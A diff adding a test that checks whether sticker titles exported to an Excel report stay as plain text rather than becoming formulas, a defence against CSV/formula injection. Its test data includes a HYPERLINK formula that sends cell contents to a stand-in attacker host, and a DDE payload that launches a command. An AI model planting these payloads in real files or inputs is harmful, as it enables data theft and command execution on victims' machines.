@@ -44,3 +44,21 @@ async def test_employee_sees_own_sent(client, team):  # noqa: F811
     st = (await ivan.get("/api/stats", params={"period": "day"})).json()
     assert st["scope"] == "sent" and st["totals"]["total"] == 1
     assert st["people"][0]["user"]["display_name"] == "Босс Главный" and st["e2e"] is None
+
+
+async def test_report_never_turns_user_text_into_formulas(client, team):
+    """A sticker title like =HYPERLINK(...) must stay text in the manager's Excel file (CSV/formula injection)."""
+    import io
+
+    import openpyxl
+
+    _, ivan = team["ivan"]
+    evil = '=HYPERLINK("https://evil.example/?d="&C9,"open")'
+    assert (await ivan.post("/api/stickers", json={"title": evil})).status_code == 201
+    assert (await ivan.post("/api/stickers", json={"title": "+cmd|' /C calc'!A0"})).status_code == 201
+    r = await client.get("/api/stats/report.xlsx", params={"period": "week"})
+    assert r.status_code == 200
+    wb = openpyxl.load_workbook(io.BytesIO(r.content))
+    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if isinstance(c.value, str)]
+    titles = [c for c in cells if "evil.example" in c.value or "calc" in c.value]
+    assert len(titles) == 2 and all(c.data_type == "s" and c.value[0] not in "=+-@" for c in titles)
